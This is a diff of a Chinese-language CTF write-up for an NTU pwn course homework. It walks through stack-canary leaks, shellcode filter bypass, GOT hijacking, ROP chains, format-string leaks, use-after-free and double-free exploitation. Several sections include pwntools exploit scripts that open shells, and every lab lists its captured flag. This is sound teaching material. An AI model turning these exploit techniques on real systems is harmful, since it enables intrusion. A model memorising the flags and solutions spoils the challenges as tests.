@@ -6,8 +6,10 @@ category: "Security/Course/NTU CS/PWN"
 ---
 
 # NTU CS 2023 HW3 Write Up
+
 ## Lab-Stackoverflow
 Flag: `flag{Y0u_know_hoW2L3@k_canAry}`
+
 ### 解題流程與思路
 這一題就是前一年的[Leak Canary](https://hackmd.io/@SBK6401/BJijt4A9s)的應用版，當時是用pwndbg，還不知道gef的偉大，總之這一題的思路就是:
 1. 接收開shell的function的address(win function)
@@ -24,6 +26,7 @@ Flag: `flag{Y0u_know_hoW2L3@k_canAry}`
 
 ![圖片](https://hackmd.io/_uploads/SyxvoO0Xa.png)
 :::
+
 ### Exploit - Leak Canary + Control RIP
 ```python=
 from pwn import *
@@ -52,8 +55,10 @@ r.sendline(payload)
 
 r.interactive()
 ```
+
 ## Lab-Shellcode
 Flag: `flag{How_you_do0o0o0o_sysca1111111}`
+
 ### 解題流程與思路
 這一題其實和[pico-filtered shellcode](https://hackmd.io/@SBK6401/HJ0Yn79ih)有點像，主要就是開個RWX權限的空間，最後跳過去執行寫的shellcode，並且在跳過去之前會檢查一些東西，像這一題就是檢查有沒有0x0f或0x05的byte，如果有就填成0，可以觀察一下寫成shellcode過後的hex到底長怎麼樣
 ```python
@@ -76,6 +81,7 @@ Flag: `flag{How_you_do0o0o0o_sysca1111111}`
   1b:   0f 05                   syscall'
 ```
 可以看到0f 05就是syscall的op code，也就是說，如果按照最簡單的shellcode送過去到最後會沒有syscall去呼叫execve，所以我們要用一些方式去bypass這個filter，例如可以先像TA上課說的，把0x0e04放到register後透過加減自行還原出0x0f05這東西，再把他放到對應的address就可以了
+
 ### Exploit
 ```python=
 from pwn import *
@@ -102,8 +108,10 @@ r.sendline(payload)
 
 r.interactive()
 ```
+
 ## Lab-Got
 Flag: `flag{Libccccccccccccccccccccccccccc}`
+
 ### 解題流程與思路
 這一題就和[0x06(GOT hijacking)](https://hackmd.io/@SBK6401/S1BBpSR5s)差不多，首先有幾個條件才能達到這個攻擊
 1. 要hijack的function在完成hijack之後當然還要再呼叫一次，這樣才會真的執行攻擊
@@ -160,6 +168,7 @@ Flag: `flag{Libccccccccccccccccccccccccccc}`
     0x7ffff7dd8d90 <realpath_stk>:  0x5441554156415741      0x000898ec81485355
     0x7ffff7dd8da0 <realpath_stk+16>:       0x4864082474894800      0x480000002825048b
     ```
+
 ### Exploit
 ```python
 from pwn import *
@@ -179,8 +188,10 @@ r.sendlineafter(b'val: ', str(system_addr).encode())
 
 r.interactive()
 ```
+
 ## HW-Notepad-Stage1
 Flag: `flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}`
+
 ### 解題流程與思路
 這一題是等到助教給出hint才之到大概的方向，我一開始也是有一些初步的方向，不過不知道怎麼把卡住的地方解決，最後也是求助@davidchen學長才知道確切的方法。
 
@@ -189,8 +200,10 @@ Flag: `flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}`
     想到這邊我先說我的看法，如果要把`.txt` bypass掉，一開始是參考[飛飛的網站範例](https://feifei.tw/file-path-traversal/)中有針對URL based的path traversal類似的情況在payload的最後面加上null byte，所以我想可以用同樣的方式bypass(`\x00`)，但是怎樣的沒有成功，另外我還有一個疑問，res.res的部分到底是不是一個path，如果不是，就代表我們也需要把它蓋掉或是用其他方法leak出來之類的；當然如果是path的話就沒差了，但我很常陷入這種沒有必要的迴圈轉不出來，其實現在仔細想想，他一定是一個path，因為他最後也是要和`{notename}.txt`接在一起，如果他不是path就一定讀不到
     
 2. 反正後來和@davidchen討論完才大致知道如何寫script，簡單來說，因為path的限制長度是128 bytes，所以`res.res` + {notename} + `.txt`基本上長度不會超過128 bytes，如果會的話就會被擠出去，所以我們能夠控制的部分就是notename，雖然我們不知道`res.res`的長度多少，但我們可以爆破，讓這三者串在一起會大於128 bytes並且沒有被寫入path的部分就是`.txt`，這樣的話就可以順利讀到flag的內容，具體怎麼做就是一直加上`/`
+
 ## HW-Notepad-Stage2
 Flag: `flag{why_d0_y0u_KnoM_tH1s_c0WW@nd!?}`
+
 ### 解題流程與思路
 :::success
 Special Thanks @cs-otaku For the most of the Inspiration of the WP
@@ -414,13 +427,17 @@ Special Thanks @cs-otaku For the most of the Inspiration of the WP
         """
         ```
 4. 接著我們就只要透過command 4的write note功能把構建好的shellcode，寫到/proc/self/mem對應的位置就好，也就是置換掉puts原本的操作，讓他再次call到puts的時候就會執行我們的shellcode
+
 ## HW-Notepad-Stage3
+
 ### 解題流程與思路
 1. 首先，後端有一個洞，就是在login的write，他的buf仔細和其他有call到write做對比會發現，他並沒有清掉buf的內容，這代表他會完完整整的把裡面的內容送到前端，但為甚麼前面兩題都沒有這個問題呢?因為前端並沒有把buf的內容印出來，所以首要目標是找到一個方法可以leak出內容的shellcode之類的，這樣我們就可以抓到text / libc base address
 2. 知道這些事情可以幹嘛呢?check token有一個bof的洞，我們可以利用這個洞來傳送rop，所以需要ret2libc抓到base address之後在蓋rop
 3. ROP具體的內容是甚麼呢?有兩種方法可以拿到flag，一個是拿到shell之後setuid(0)，因為backend 有 suid 權限，所以我們才可以用 setuid(0) 以root 執行，然後cat /flag_root；第二種是直接ORW，看flag是啥這樣
+
 ## Lab-ROP_RW
 Flag: `flag{ShUsHuSHU}`
+
 ### 解題流程與思路
 先看這個程式的行為，在main當中，他會打開flag.txt和urandom這兩個file，然後做兩者的XOR，並且回傳urandom的內容給我們，並且有BOF的漏洞存在
 :::info
@@ -466,8 +483,10 @@ $$
     )
     ```
 2. 等到跳到check function後就可以開始接return output，並按照上面的公式回推flag
+
 ## Lab-ROP_Syscall
 Flag: `flag{www.youtube.com/watch?v=apN1VxXKio4}`
+
 ### 解題流程與思路
 這一題就和之前寫的[Simple PWN - 0x12(Lab - rop++)](https://hackmd.io/@SBK6401/rysBjQfjs)差不多，一樣是利用蓋ROP chain拿到shell，先看一下checksec
 ```bash
@@ -484,6 +503,7 @@ $ checksec chal
 2. PIE沒開
 3. 有BOF
 這樣的話就可以使用rop chain的方法拿到shell，用rop gadget拿到`pop rax ; ret`, `pop rdi ; ret`, `pop rsi ; ret`, `pop rdx ; ret`, `syscall`等gadget，接著利用BOF的方式送過去，然後還要考慮送rop chain之前有多少的垃圾bytes，這個可以直接用動態看
+
 ### Exploit
 ```python
 from pwn import *
@@ -515,8 +535,10 @@ r.sendline(b'a' * 24 + rop_chain)
 
 r.interactive()
 ```
+
 ## Lab-ret2plt
 Flag: `flag{__libc_csu_init_1s_P0w3RFu1l!!}`
+
 ### 解題流程與思路
 1. checksec + file + ROPgadget
     ```bash
@@ -575,8 +597,10 @@ Flag: `flag{__libc_csu_init_1s_P0w3RFu1l!!}`
     bss_addr
     puts_plt
     ```
+
 ## Lab-Stack Pivot
 Flag: `flag{Y0u_know_hoW2L3@k_canAry}`
+
 ### 解題流程與思路
 這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall
 1. checksec + file
@@ -714,8 +738,10 @@ $ docker exec -it {container name} /bin/bash
 > python3 exp.py
 ```
 :::
+
 ## Lab-FMT
 Flag: `flag{www.youtube.com/watch?v=Ci_zad39Uhw}`
+
 ### 解題流程與思路
 這一題和之前寫過的FMT題目大同小異，不過有加入%s的觀念在裡面，可以先參考[PicoCTF - flag leak](https://hackmd.io/@SBK6401/ByE7M6djn)
 1. 首先題目會讀取`/home/chal/flag.txt`並寫入到global variable - flag中，所以目標很明確，就是要利用兩次的printf的format string bug讀取到flag，而為甚麼要兩次呢?第一次就是要leak出bss section的base address，或是可以說text section的base address，第二次就是利用該結果實際leak出flag的內容
@@ -826,8 +852,10 @@ Flag: `flag{www.youtube.com/watch?v=Ci_zad39Uhw}`
     payload += p64(flag_addr)
     ```
     :::
+
 ## HW-HACHAMA
 Flag: `flag{https://www.youtube.com/watch?v=qbEdlmzQftE&list=PLQoA24ikdy_lqxvb6f70g1xTmj2u-G3NT&index=1}`
+
 ### 解題流程與思路
 :::warning
 切記題目用read接，所以不需要null byte做結尾，另外題目使用的libc是ubuntu 22.04.2的版本，所以可以用docker把libc資料撈出來，再針對這個做應用
@@ -931,8 +959,10 @@ Flag: `flag{https://www.youtube.com/watch?v=qbEdlmzQftE&list=PLQoA24ikdy_lqxvb6f
 3. IO problem
     這個問題也是很弔詭，會發現我在最後一個send之前還有一個raw_input()，如果拿掉的話在remote一樣會爛掉，這有可能是IO之類的問題，但總之一定要加
 :::
+
 ## Lab-UAF
 Flag: `flag{https://www.youtube.com/watch?v=CUSUhXqThjY}`
+
 ### 解題流程與思路
 這是個經典的表單題，總共有四種command(註冊entity / 刪除entity / 設定entity name / 觸發entitiy function pointer)，這種題目因為格局比較大，所以我都會先看哪裡有malloc或是free，首先
 
@@ -962,13 +992,16 @@ Flag: `flag{https://www.youtube.com/watch?v=CUSUhXqThjY}`
     0x560bb1125300: "sh"
     ```
 5. 最後我們再利用entity 0的名義，trigger function pointer，就拿到shell了
+
 ## Lab-Double Free
 Flag: `flag{a_iU8YeH944}`
+
 ### 解題流程與思路
 :::warning
 Run On Ubuntu 20.04
 :::
 這一題有很多種方式可以拿到shell，不過原理都是一樣的，前置作業都是一樣的，也就是要利用UAF去leak出libc address，接著算出`__free_hook`以及`system`的位址，接著想辦法把`system`寫到`__free_hook`的位址，此時就有兩種方式可以寫，一種是利用此次學到的double free，把值寫到最後一個在tcache的free chunk，蓋掉他的fd，接著就可以用add_note把tcache的值要回來，並寫system的address進到__free_hook；另一種方式就比較簡單，也就是把free chunk的fd利用UAF的特性改掉，並且直接add_note把東西從tcache要回來，之後就一樣寫system_addr，後free掉一個帶有/bin/sh的chunk，此時就會開一個shell給我們了
+
 #### 前置作業: Leak Libc Address
 關於這一點可以參考[如何用UAF leak libc address?](https://hackmd.io/@SBK6401/SJWc9v4Bp#%E5%A6%82%E4%BD%95%E7%94%A8UAF-leak-libc-address)，方法都一樣，首先要想辦法讓free chunk進到unsorted bin中(最簡單的方法就是設定超過0x410的空間)，接著因為malloc的時候沒有實作清空原本的資料，導致我們可以leak其中有關libc section的資訊。底下的設定意思是我們先設定三個notes，#14的意思是不要讓#13被free掉的時候被consolidate用的，接著我們把前兩個free掉，結果如下
 ![image](https://hackmd.io/_uploads/r14opZfL6.png)
@@ -994,6 +1027,7 @@ log.success(f'System Address = {hex(system_addr)}')
 log.success(f'Free Hook = {hex(free_hook)}')
 r.recv(0x420 - 0x8)
 ```
+
 #### 方法一: Double Fee
 有了libc address後，我們要想辦法把system address寫到`__free_hook`的位置，如果是要用double free的方法的話可以參考上課的講義:
 ![image](https://hackmd.io/_uploads/SJNM1Mf8T.png)
@@ -1037,6 +1071,7 @@ write_note(11, p64(system_addr))
 ![image](https://hackmd.io/_uploads/SydnNzMIa.png)
 
 最後的結果如上圖，會發現note #11已經變成==0x7f900aa8ae48==，這個就是`__free_hook`的位址，進去看發現已經被我們寫入system address，這個時候我們只要把含有`/bin/sh\x00`的note #9 free掉，就可以開shell了
+
 #### 方法二: 一般的寫入
 這一個方法比較方便，也和double free沒關係，反正我們只要利用UAF的特性，也可以把free chunk的fd改掉，再用像前面的方法就可以開shell
 
@@ -1053,8 +1088,10 @@ write_note(1, p64(free_hook) + p64(0) * 2)
 接著就把`/bin/sh\x00`寫到note #2，接著就不斷add_note，把`__free_hook`的address拿到手，然後再把system address寫到`__free_hook`，最後把含有`/bin/sh\x00`的note #2 free掉，結果如下圖:
 ![image](https://hackmd.io/_uploads/HkGsPGfL6.png)
 從上圖得知，note #4的address已經被我們換成`__free_hook` address，並且實際跟進去就是system address，最後只要free掉note #2就可以開shell了
+
 ## HW-UAF++
 Flag: `flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}`
+
 ### 解題流程與思路
 :::info
 * 這一題是run在==20.04==的環境，在做題目之前要先看一下docker file
